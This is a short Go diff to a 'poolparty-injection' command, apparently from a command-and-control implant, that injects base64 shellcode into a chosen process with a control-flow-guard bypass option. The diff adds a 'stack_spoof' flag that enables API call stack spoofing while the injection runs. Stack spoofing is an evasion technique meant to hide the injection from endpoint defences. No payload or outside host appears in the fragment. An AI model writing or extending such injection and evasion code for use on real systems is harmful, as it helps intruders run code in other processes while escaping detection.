@@ -48,8 +48,9 @@ type PoolPartyInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	Variant      int    `json:"variant"`
-	Target       string `json:"target"`    // "auto", "auto-elevated", "auto-user"
+	Target       string `json:"target"`     // "auto", "auto-elevated", "auto-user"
 	CFGBypass    bool   `json:"cfg_bypass"` // Mark shellcode as valid CFG target (variants 2-8)
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
 // Execute executes the poolparty-injection command
@@ -93,6 +94,11 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 
 	if len(shellcode) == 0 {
 		return errorResult("Error: Shellcode data is empty")
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	var output string
